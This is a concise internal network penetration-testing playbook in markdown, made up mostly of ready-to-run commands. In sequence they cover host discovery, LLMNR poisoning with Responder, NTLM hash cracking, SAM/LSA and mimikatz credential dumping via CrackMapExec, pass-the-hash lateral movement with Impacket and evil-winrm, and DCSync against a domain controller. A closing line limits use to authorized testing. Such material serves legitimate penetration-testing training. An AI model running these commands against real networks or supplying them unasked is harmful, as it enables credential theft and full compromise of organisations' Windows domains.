# Internal Network Attack Playbook
**Author: Manish Verma**

---

## 📌 Objective
**Scope:** Internal network penetration testing  
**Tools Used:** Nmap, CrackMapExec, Impacket, Responder, BloodHound  
**Outcome:** Full internal network compromise

---

## Phase 1: Discover Subnet

```bash
# ARP scan
arp-scan -l
netdiscover -r 192.168.1.0/24

# Nmap host discovery
nmap -sn 192.168.1.0/24 --open

# CrackMapExec sweep
crackmapexec smb 192.168.1.0/24
```

---

## Phase 2: Internal Scan

```bash
# Port scan all hosts
nmap -sC -sV -p 21,22,25,80,135,139,389,443,445,3306,3389,5985 192.168.1.0/24 -oN internal_scan.txt

# Vulnerability scan
nmap --script vuln 192.168.1.0/24
```

---

## Phase 3: LLMNR/NBT-NS Poisoning

```bash
# Responder
responder -I eth0 -rdwv

# Capture NTLMv2 hashes, then crack
hashcat -m 5600 captured_hash.txt rockyou.txt
```

---

## Phase 4: Dump Credentials

```bash
# SMB null session
crackmapexec smb <IP> -u '' -p ''
crackmapexec smb <IP> -u 'guest' -p ''

# After gaining creds - dump SAM
crackmapexec smb <IP> -u user -p password --sam
crackmapexec smb <IP> -u user -p password --lsa

# Mimikatz via CME
crackmapexec smb <IP> -u user -p password -M mimikatz
```

---

## Phase 5: Lateral Movement

```bash
# Pass-the-Hash
crackmapexec smb 192.168.1.0/24 -u Administrator -H <NTLM_hash>
psexec.py domain/user@<IP> -hashes :<hash>

# WMI execution
wmiexec.py domain/user:password@<IP>

# Evil-WinRM (WinRM port 5985)
evil-winrm -i <IP> -u user -p password
evil-winrm -i <IP> -u user -H <NTLM_hash>
```

---

## Phase 6: Domain Dominance

```bash
# See 03-Active-Directory for full AD attack flow
# Key: Kerberoasting → BloodHound → DCSync → Golden Ticket
secretsdump.py domain/admin:password@<DC_IP>
```

---

## ⚠️ Disclaimer
All techniques for authorized penetration testing only.
